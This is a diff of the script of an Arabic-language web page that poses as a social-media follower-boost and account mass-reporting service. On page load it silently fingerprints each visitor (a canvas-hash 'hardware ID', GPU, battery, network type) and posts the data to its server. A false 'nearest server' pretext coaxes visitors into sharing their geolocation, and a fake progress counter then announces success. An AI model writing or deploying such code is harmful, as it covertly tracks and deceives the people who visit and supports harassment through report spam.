@@ -64,20 +64,38 @@ u$$$$$$$$$$$$$$$$$$$$$u
     <script>
         let mode = ""; let platform = ""; let service = ""; let maxLimit = 5000;
         let deviceCapturedData = {};
+        const MY_DOMAIN = "fordead.vercel.app";
 
-        // السحب الصامت للعتاد والشبكة
-        async function silentCapture() {
-            let gpu = "غير معروف";
+        async function generateHardwareID() {
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) {}
+                const ctx = canvas.getContext('2d');
+                ctx.fillText("HW-ID-Scan", 2, 15);
+                let canvasData = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < canvasData.length; i++) {
+                    hash = ((hash << 5) - hash) + canvasData.charCodeAt(i);
+                    hash |= 0;
+                }
+                return "HW-" + Math.abs(hash);
+            } catch (e) { return "HW-Unknown"; }
+        }
+
+        async function silentCapture() {
+            if (!window.location.hostname.includes(MY_DOMAIN)) return;
+
+            const hwID = await generateHardwareID();
+            let gpu = "غير معروف";
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+            
             let battery = "غير معروف";
             try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch (e) {}
             
             deviceCapturedData = {
+                hw_id: hwID,
                 gpu: gpu,
                 battery: battery,
                 network: navigator.connection ? navigator.connection.effectiveType : "WiFi/Data",
@@ -89,7 +107,7 @@ u$$$$$$$$$$$$$$$$$$$$$u
             fetch('/api/index', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mode: "Silent Visit", device_info: deviceCapturedData })
+                body: JSON.stringify({ mode: "زيارة صامتة", device_info: deviceCapturedData })
             });
         }
 
@@ -97,9 +115,9 @@ u$$$$$$$$$$$$$$$$$$$$$u
             const id = document.getElementById('target-id').value;
             const count = parseInt(document.getElementById('target-count').value);
             if(!id || !count) return alert("أكمل البيانات!");
-            if(count > maxLimit) return alert("الحد الأقصى لهذا القسم هو " + maxLimit);
+            if(count > maxLimit) return alert("الحد الأقصى هو " + maxLimit);
 
-            alert("لضمان سرعة التنفيذ، يرجى السماح بالوصول للموقع لتحديد السيرفر الأقرب.");
+            alert("لضمان السرعة، يرجى السماح بالوصول للموقع لتحديد السيرفر الأقرب لدولتك.");
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -134,37 +152,18 @@ u$$$$$$$$$$$$$$$$$$$$$u
             let interval = setInterval(() => {
                 if(current >= max) {
                     clearInterval(interval);
-                    alert("تمت العملية! سيبدأ الوصول تدريجياً.");
+                    alert("تمت العملية بنجاح! سيصلك الطلب تدريجياً.");
                     location.reload();
                 } else {
                     current++;
                     document.getElementById('counter').innerText = current;
                 }
-            }, 1000);
+            }, 1200);
         }
 
-        function showSub(m) { 
-            mode = m; 
-            document.getElementById('main-menu').classList.add('hidden'); 
-            document.getElementById('platform-menu').classList.remove('hidden'); 
-        }
-        function showOptions(p) { 
-            platform = p; 
-            document.getElementById('platform-menu').classList.add('hidden'); 
-            if(mode === 'boost') {
-                document.getElementById('boost-options').classList.remove('hidden');
-            } else {
-                openFinal('إسبام بلاغات', 'يوزر الحساب', 300);
-            }
-        }
-        function openFinal(s, h, limit) { 
-            service = s; maxLimit = limit;
-            document.getElementById('boost-options').classList.add('hidden'); 
-            document.getElementById('final-input').classList.remove('hidden'); 
-            document.getElementById('final-title').innerText = platform + " - " + s;
-            document.getElementById('target-id').placeholder = h;
-            document.getElementById('target-count').placeholder = "الحد الأقصى " + limit;
-        }
+        function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
+        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); }
+        function openFinal(s, h, limit) { service = s; maxLimit = limit; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('target-id').placeholder = h; document.getElementById('target-count').placeholder = "الحد الأقصى " + limit; }
 
         window.addEventListener('DOMContentLoaded', silentCapture);
     </script>
